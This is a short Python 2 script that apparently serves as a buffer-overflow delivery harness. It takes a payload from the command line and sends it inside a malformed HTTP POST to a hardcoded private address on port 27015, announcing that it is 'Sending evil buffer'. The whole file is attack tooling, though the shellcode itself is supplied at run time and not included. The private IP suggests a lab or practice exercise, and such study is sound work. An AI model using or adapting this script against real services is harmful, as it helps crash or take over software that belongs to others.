#!/usr/bin/python
import socket
import sys

def main(argv):
	if(len(argv) < 1):
		print "You're beat, no args supplied!"
		sys.exit()

	payload = argv[0]
	#print "You entered:\n", payload
	try:
		print "\nSending evil buffer..."
		buffer = payload

		s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

		s.connect(("192.168.189.134", 27015))
		s.send("POST / HTTP/1.1/\n\r".encode() + buffer + '\r\n')
		print "\nEvil buffer Sent!"
		s.close()

	except:
		print "\nCould not connect!"
		sys.exit()

if __name__ == "__main__":
	main(sys.argv[1:])